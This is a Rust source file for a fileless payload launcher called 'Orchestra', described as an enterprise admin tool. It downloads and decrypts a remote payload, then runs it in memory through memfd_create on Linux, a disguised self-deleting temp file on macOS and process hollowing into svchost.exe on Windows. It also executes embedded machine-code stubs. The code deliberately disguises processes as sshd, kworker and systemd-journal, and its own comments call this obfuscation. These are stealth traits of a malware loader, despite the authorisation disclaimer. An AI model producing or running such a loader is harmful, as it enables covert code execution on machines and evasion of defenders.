//! Orchestra in-memory agent launcher.
//!
//! # Purpose
//!
//! For enterprise deployment scenarios where IT administrators want to run the
//! Orchestra agent on a managed endpoint **without** persisting an executable
//! to disk, this small utility:
//!
//! 1. Downloads an AES-256-GCM-encrypted agent payload over HTTPS.
//! 2. Decrypts it in process memory using a pre-shared key supplied on the
//!    command line.
//! 3. On Linux, materialises the decrypted ELF inside an anonymous
//!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
//!    inheriting the launcher's argv/env. Nothing is ever written to a
//!    real filesystem.
//! 4. On non-Linux platforms the in-memory primitive is unavailable; the
//!    launcher logs a clear error and exits with a non-zero status.
//!
//! # Authorisation
//!
//! This binary is intended **only** for use by administrators who own the
//! managed endpoint or have written authorisation to operate it. Running it
//! against systems you do not control may violate computer-misuse law in
//! your jurisdiction.

use anyhow::{anyhow, Context, Result};
use base64::Engine;
use clap::Parser;
use common::CryptoSession;
use rand::seq::SliceRandom;

#[derive(Parser, Debug)]
#[command(
    author,
    version,
    about = "Download, decrypt, and execute an Orchestra agent payload entirely in memory."
)]
struct Cli {
    /// Full HTTPS URL of the encrypted payload (e.g.
    /// `https://updates.example.com/agent.enc`).
    #[arg(long)]
    url: String,

    /// Base64-encoded AES-256 pre-shared key used to decrypt the payload.
    #[arg(long)]
    key: String,

    /// Allow an HTTP (non-TLS) download URL.
    /// **INSECURE** — for development and testing only; never use in production.
    #[arg(long, default_value_t = false)]
    allow_insecure_http: bool,

    /// Optional arguments to pass to the launched agent process.
    #[arg(last = true)]
    agent_args: Vec<String>,
}

/// Download `url`, retrying up to `max_attempts` times with exponential
/// backoff. Never logs the URL more than once or any response body content.
async fn download_with_retry(url: &str, max_attempts: u32) -> Result<Vec<u8>> {
    let mut delay = std::time::Duration::from_millis(500);
    let mut last_err: Option<anyhow::Error> = None;
    for attempt in 1..=max_attempts {
        tracing::info!(attempt, max_attempts, "downloading encrypted payload");
        match reqwest::get(url).await {
            Ok(resp) => match resp.error_for_status() {
                Ok(ok) => match ok.bytes().await {
                    Ok(bytes) => return Ok(bytes.to_vec()),
                    Err(e) => last_err = Some(anyhow!("read body failed: {e}")),
                },
                Err(e) => last_err = Some(anyhow!("HTTP error: {e}")),
            },
            Err(e) => last_err = Some(anyhow!("request failed: {e}")),
        }
        if attempt < max_attempts {
            tracing::warn!(?delay, "download failed; backing off");
            tokio::time::sleep(delay).await;
            delay *= 2;
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow!("download failed")))
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();

    let cli = Cli::parse();

    // Enforce HTTPS unless the explicit insecure override is passed.
    if !cli.url.starts_with("https://") && !cli.allow_insecure_http {
        anyhow::bail!(
            "--url must use HTTPS (got: {}). \
             Pass --allow-insecure-http to override (development/testing only).",
            &cli.url[..cli.url.len().min(40)]
        );
    }
    if cli.allow_insecure_http {
        tracing::warn!(
            "WARNING: --allow-insecure-http is set. \
             The payload URL is NOT using TLS. Do not use this flag in production."
        );
    }

    let key_bytes = base64::engine::general_purpose::STANDARD
        .decode(&cli.key)
        .context("--key is not valid Base64")?;

    let encrypted = download_with_retry(&cli.url, 3).await?;
    tracing::info!(bytes = encrypted.len(), "payload downloaded");

    // Detect POLY wire format (magic "POLY" = 0x504F4C59).
    let decrypted = if encrypted.starts_with(b"POLY") {
        poly_decrypt(&encrypted)?
    } else {
        let session = CryptoSession::from_shared_secret(&key_bytes);
        session
            .decrypt(&encrypted)
            .map_err(|e| anyhow!("Payload decryption failed: {e}"))?
    };
    tracing::info!(bytes = decrypted.len(), "payload decrypted");

    execute_in_memory(&decrypted, &cli.agent_args)
}

/// Decode and execute a POLY-format encrypted payload.
///
/// Supports:
/// - Scheme 0 (AesCtrStream): AES-256-CTR decryption
/// - Scheme 2 (ChaCha20Stream): ChaCha20 decryption
/// - Scheme 3 (RawStub): execute embedded x86_64 machine-code stub via
///   mmap + mprotect on Linux x86_64
fn poly_decrypt(data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 9 {
        anyhow::bail!("POLY blob too short");
    }
    // "POLY" + 1-byte scheme
    let scheme = data[4];
    // key_len (BE u32) at offset 5
    let key_len = u32::from_be_bytes(data[5..9].try_into().unwrap()) as usize;
    if data.len() < 9 + key_len + 4 {
        anyhow::bail!("POLY blob truncated in key field");
    }
    let key = &data[9..9 + key_len];
    let ct_offset = 9 + key_len;
    let ct_len = u32::from_be_bytes(data[ct_offset..ct_offset + 4].try_into().unwrap()) as usize;
    if data.len() < ct_offset + 4 + ct_len {
        anyhow::bail!("POLY blob truncated in ciphertext field");
    }
    let ct = &data[ct_offset + 4..ct_offset + 4 + ct_len];

    match scheme {
        0 => poly_decrypt_aes_ctr(ct, key),
        2 => poly_decrypt_chacha20(ct, key),
        3 => poly_exec_raw_stub(ct, key),
        other => anyhow::bail!("Unknown POLY scheme ID {other}"),
    }
}

/// AES-256-CTR decryption for scheme 0.
/// Key layout: bytes 0..31 = AES-256 key; bytes 32..47 = initial counter.
fn poly_decrypt_aes_ctr(ct: &[u8], key: &[u8]) -> Result<Vec<u8>> {
    if key.len() < 32 {
        anyhow::bail!("AesCtrStream key too short ({} bytes)", key.len());
    }
    Ok(aes256_ctr_xor(ct, key))
}

/// ChaCha20 decryption for scheme 2.
/// Key layout: bytes 0..31 = ChaCha20 key; bytes 32..43 = nonce.
fn poly_decrypt_chacha20(ct: &[u8], key: &[u8]) -> Result<Vec<u8>> {
    if key.len() < 32 {
        anyhow::bail!("ChaCha20Stream key too short ({} bytes)", key.len());
    }
    Ok(chacha20_xor(ct, key))
}

/// Execute the raw-stub (scheme 3).  The `stub` bytes are the machine code
/// stub emitted by the packager's `stub_emitter`; the stub decrypts `ct`
/// in-place into a new allocation and returns a pointer that we wrap in a Vec.
///
/// On Linux x86_64: mmap an RWX page, copy the stub, mprotect to RX, call it.
/// On other platforms: fall back to XOR-with-key-cycle (the stub uses the
/// same algorithm).
fn poly_exec_raw_stub(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        return poly_exec_raw_stub_linux(ct, stub);
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        // Fallback: the stub implements XOR-with-cycled-key; the key bytes are
        // appended after the RET instruction.  We can't easily parse the offset
        // without running the stub, so we just signal an error on unsupported
        // platforms.
        let _ = stub;
        let _ = ct;
        anyhow::bail!(
            "RawStub scheme (ID 3) requires Linux x86_64; \
             repack the payload with a different scheme for this platform"
        );
    }
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn poly_exec_raw_stub_linux(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
    use libc::{mmap, mprotect, munmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};

    if stub.is_empty() {
        anyhow::bail!("RawStub: empty stub code");
    }

    let page_size = 4096usize;
    let stub_pages = ((stub.len() + page_size - 1) / page_size) * page_size;

    // Allocate and populate stub page.
    // SAFETY: standard mmap / mprotect usage with validated inputs.
    let stub_page = unsafe {
        let p = mmap(
            std::ptr::null_mut(), stub_pages,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0,
        ) as *mut u8;
        if p.is_null() || p == libc::MAP_FAILED as *mut u8 {
            anyhow::bail!("mmap for stub failed: {}", std::io::Error::last_os_error());
        }
        std::ptr::copy_nonoverlapping(stub.as_ptr(), p, stub.len());
        if mprotect(p as *mut _, stub_pages, PROT_READ | PROT_EXEC) != 0 {
            munmap(p as *mut _, stub_pages);
            anyhow::bail!("mprotect(RX) for stub failed: {}", std::io::Error::last_os_error());
        }
        p
    };

    // Allocate output buffer.
    let mut output = vec![0u8; ct.len()];

    // Call the stub:
    //   extern "C" fn(ct: *const u8, ct_len: usize, key: *const u8, out: *mut u8)
    // The stub has the key embedded as RIP-relative data; the `key` parameter
    // (arg 2 = RDX) is ignored by the stub — it uses its internal RIP-relative
    // key — but we pass a null pointer to satisfy the calling convention.
    //
    // SAFETY: we verified `stub_page` points to valid RX memory containing
    // the stub, and `output` has exactly `ct.len()` bytes allocated.
    unsafe {
        let f: extern "C" fn(*const u8, usize, *const u8, *mut u8) =
            std::mem::transmute(stub_page);
        f(ct.as_ptr(), ct.len(), std::ptr::null(), output.as_mut_ptr());
    }

    // Release stub page.
    unsafe {
        libc::munmap(stub_page as *mut _, stub_pages);
    }

    tracing::info!(
        ct_bytes = ct.len(),
        stub_bytes = stub.len(),
        "RawStub decryption complete"
    );
    Ok(output)
}

// ── Inline ChaCha20 and AES-256-CTR for the launcher ─────────────────────────
// These are self-contained copies so the launcher does not depend on the
// packager crate.  They are intentionally minimal.

fn aes256_ctr_xor(data: &[u8], key_material: &[u8]) -> Vec<u8> {
    // AES S-box
    const SBOX: [u8; 256] = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ];
    fn xtime(x: u8) -> u8 { if x & 0x80 != 0 { (x << 1) ^ 0x1b } else { x << 1 } }
    fn sub_word(w: u32) -> u32 {
        let b = w.to_be_bytes();
        u32::from_be_bytes([SBOX[b[0] as usize], SBOX[b[1] as usize], SBOX[b[2] as usize], SBOX[b[3] as usize]])
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&key_material[..32]);
    let mut counter = [0u8; 16];
    if key_material.len() >= 48 { counter.copy_from_slice(&key_material[32..48]); }
    const RCON: [u8; 8] = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40];
    let mut w = [0u32; 60];
    for i in 0..8 { w[i] = u32::from_be_bytes([key[i*4],key[i*4+1],key[i*4+2],key[i*4+3]]); }
    for i in 8..60 {
        let mut t = w[i-1];
        if i % 8 == 0 { t = sub_word(t.rotate_left(8)) ^ ((RCON[i/8] as u32) << 24); }
        else if i % 8 == 4 { t = sub_word(t); }
        w[i] = w[i-8] ^ t;
    }
    fn add_rk(state: &mut [u8; 16], w: &[u32; 60], r: usize) {
        for c in 0..4 { let rk = w[r*4+c].to_be_bytes(); let b = c*4; state[b]^=rk[0]; state[b+1]^=rk[1]; state[b+2]^=rk[2]; state[b+3]^=rk[3]; }
    }
    fn sub_bytes(s: &mut [u8; 16]) { for b in s.iter_mut() { *b = SBOX[*b as usize]; } }
    fn shift_rows(s: &mut [u8; 16]) {
        let t=s[1]; s[1]=s[5]; s[5]=s[9]; s[9]=s[13]; s[13]=t;
        let (t2,t6)=(s[2],s[6]); s[2]=s[10]; s[6]=s[14]; s[10]=t2; s[14]=t6;
        let t=s[3]; s[3]=s[15]; s[15]=s[11]; s[11]=s[7]; s[7]=t;
    }
    fn mix_columns(s: &mut [u8; 16]) {
        for c in 0..4 { let b=c*4; let (a0,a1,a2,a3)=(s[b],s[b+1],s[b+2],s[b+3]); let t=a0^a1^a2^a3; s[b]^=t^xtime(a0^a1); s[b+1]^=t^xtime(a1^a2); s[b+2]^=t^xtime(a2^a3); s[b+3]^=t^xtime(a3^a0); }
    }
    fn encrypt_block(input: &[u8;16], w: &[u32;60]) -> [u8;16] {
        let mut s = *input; add_rk(&mut s,w,0);
        for r in 1..14 { sub_bytes(&mut s); shift_rows(&mut s); mix_columns(&mut s); add_rk(&mut s,w,r); }
        sub_bytes(&mut s); shift_rows(&mut s); add_rk(&mut s,w,14); s
    }
    fn inc_ctr(c: &mut [u8;16]) { for b in c.iter_mut().rev() { let (n,carry)=b.overflowing_add(1); *b=n; if !carry { break; } } }
    let mut out = Vec::with_capacity(data.len());
    for chunk in data.chunks(16) {
        let ks = encrypt_block(&counter, &w);
        for (i, &b) in chunk.iter().enumerate() { out.push(b ^ ks[i]); }
        inc_ctr(&mut counter);
    }
    out
}

fn chacha20_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    fn qr(a: u32, b: u32, c: u32, d: u32) -> (u32, u32, u32, u32) {
        let a=a.wrapping_add(b); let d=(d^a).rotate_left(16);
        let c=c.wrapping_add(d); let b=(b^c).rotate_left(12);
        let a=a.wrapping_add(b); let d=(d^a).rotate_left(8);
        let c=c.wrapping_add(d); let b=(b^c).rotate_left(7);
        (a,b,c,d)
    }
    fn block(state: &[u32;16]) -> [u8;64] {
        let mut w = *state;
        for _ in 0..10 {
            let (w0,w4,w8,w12)=qr(w[0],w[4],w[8],w[12]); w[0]=w0;w[4]=w4;w[8]=w8;w[12]=w12;
            let (w1,w5,w9,w13)=qr(w[1],w[5],w[9],w[13]); w[1]=w1;w[5]=w5;w[9]=w9;w[13]=w13;
            let (w2,w6,w10,w14)=qr(w[2],w[6],w[10],w[14]); w[2]=w2;w[6]=w6;w[10]=w10;w[14]=w14;
            let (w3,w7,w11,w15)=qr(w[3],w[7],w[11],w[15]); w[3]=w3;w[7]=w7;w[11]=w11;w[15]=w15;
            let (w0,w5,w10,w15)=qr(w[0],w[5],w[10],w[15]); w[0]=w0;w[5]=w5;w[10]=w10;w[15]=w15;
            let (w1,w6,w11,w12)=qr(w[1],w[6],w[11],w[12]); w[1]=w1;w[6]=w6;w[11]=w11;w[12]=w12;
            let (w2,w7,w8,w13)=qr(w[2],w[7],w[8],w[13]); w[2]=w2;w[7]=w7;w[8]=w8;w[13]=w13;
            let (w3,w4,w9,w14)=qr(w[3],w[4],w[9],w[14]); w[3]=w3;w[4]=w4;w[9]=w9;w[14]=w14;
        }
        let mut out = [0u8;64];
        for i in 0..16 { out[i*4..i*4+4].copy_from_slice(&w[i].wrapping_add(state[i]).to_le_bytes()); }
        out
    }
    let mut kw = [0u32; 8];
    for i in 0..8 { kw[i]=u32::from_le_bytes(key[i*4..i*4+4].try_into().unwrap()); }
    let nonce: [u8;12] = if key.len()>=44 { key[32..44].try_into().unwrap() } else { [0u8;12] };
    let mut nw = [0u32; 3];
    for i in 0..3 { nw[i]=u32::from_le_bytes(nonce[i*4..i*4+4].try_into().unwrap()); }
    let constants: [u32;4] = [0x61707865,0x3320646e,0x79622d32,0x6b206574];
    let mut out = Vec::with_capacity(data.len());
    let mut ctr: u32 = 1;
    let mut ks_pos = 64usize;
    let mut ks = [0u8; 64];
    for &byte in data {
        if ks_pos >= 64 {
            let state: [u32;16] = [constants[0],constants[1],constants[2],constants[3],kw[0],kw[1],kw[2],kw[3],kw[4],kw[5],kw[6],kw[7],ctr,nw[0],nw[1],nw[2]];
            ks = block(&state); ks_pos=0; ctr=ctr.wrapping_add(1);
        }
        out.push(byte ^ ks[ks_pos]); ks_pos+=1;
    }
    out
}

#[cfg(target_os = "linux")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    // Obfuscate memfd name
    let mut rng = rand::thread_rng();
    let potential_names = ["systemd-journal", "kworker/u16:0", "rcu_preempt"];
    let chosen_name = *potential_names.choose(&mut rng).unwrap();
    let name = CString::new(format!("{}-{}", chosen_name, std::process::id())).unwrap();

    // SAFETY: `name` is a valid nul-terminated C string.
    let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
    if fd == -1 {
        return Err(anyhow!(
            "memfd_create failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `fd` is a valid descriptor we just created and own.
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    file.write_all(payload)
        .context("Failed to write payload into memfd")?;

    let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();

    // Obfuscate argv[0]
    let argv0 = CString::new("/usr/sbin/sshd").unwrap();
    let mut argv: Vec<CString> = std::iter::once(argv0)
        .chain(
            args.iter()
                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
        )
        .collect();
    let argv_ptrs: Vec<*const libc::c_char> = argv
        .iter_mut()
        .map(|c| c.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    // Only log in debug builds
    #[cfg(debug_assertions)]
    tracing::info!("executing payload via /proc/self/fd/{fd}");

    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays.
    unsafe {
        libc::execv(path.as_ptr(), argv_ptrs.as_ptr());
    }
    // If we reach here, execv failed.
    Err(anyhow!("execv failed: {}", std::io::Error::last_os_error()))
}

#[cfg(target_os = "macos")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;
    use std::process::Command;

    // macOS does not reliably execute Mach-O binaries via fexecve.
    // Use a random temp path, mark executable, spawn by path, then unlink.
    let tmp_dir = std::env::temp_dir();
    let mut rng = rand::thread_rng();
    let mut tmp_path = None;

    for _ in 0..16 {
        let suffix: String = (0..12)
            .map(|_| rand::Rng::sample(&mut rng, rand::distributions::Alphanumeric) as char)
            .collect();
        let candidate = tmp_dir.join(format!(
            ".com.apple.launchd.{}.{}",
            std::process::id(),
            suffix
        ));

        match std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&candidate)
        {
            Ok(mut file) => {
                file.write_all(payload)
                    .context("failed to write payload to temp file")?;
                let mut perms = file.metadata()?.permissions();
                perms.set_mode(0o700);
                std::fs::set_permissions(&candidate, perms)?;
                tmp_path = Some(candidate);
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(anyhow!("open temp file failed: {e}")),
        }
    }

    let tmp_path = tmp_path.ok_or_else(|| anyhow!("failed to allocate unique temp path"))?;

    #[cfg(debug_assertions)]
    tracing::info!(path = %tmp_path.display(), "executing payload via temp file path");

    let spawn_result = Command::new(&tmp_path)
        .args(args)
        .env_clear()
        .env(
            "PATH",
            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        )
        .spawn();

    // Remove directory entry immediately after spawn attempt. If spawn
    // succeeded the process keeps running with its opened executable.
    if let Err(e) = std::fs::remove_file(&tmp_path) {
        tracing::warn!(path = %tmp_path.display(), error = %e, "failed to unlink temp payload");
    }

    let child = spawn_result.context("failed to spawn payload")?;
    tracing::info!(pid = child.id(), "payload process started");
    Ok(())
}

#[cfg(target_os = "windows")]
fn execute_in_memory(payload: &[u8], _args: &[String]) -> Result<()> {
    // Windows path: spawn a host process suspended (svchost.exe), allocate
    // RWX memory in it, copy the decrypted PE payload into that memory,
    // redirect the entry point in the thread context, and resume the
    // thread. Implementation lives in the shared `hollowing` crate so the
    // agent's `MigrateAgent` capability and this launcher use exactly the
    // same primitive.
    //
    // The launched payload runs detached from this process and inherits no
    // arguments, so `_args` is intentionally unused; arguments must be
    // baked into the payload at build time (`cargo build --release` with
    // any compile-time flags the agent needs).
    tracing::info!(
        bytes = payload.len(),
        "launching payload via process hollowing into svchost.exe"
    );
    hollowing::hollow_and_execute(payload).map_err(|e| anyhow!("process hollowing failed: {e}"))
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
    Err(anyhow!(
        "Unsupported platform for in-memory agent execution"
    ))
}
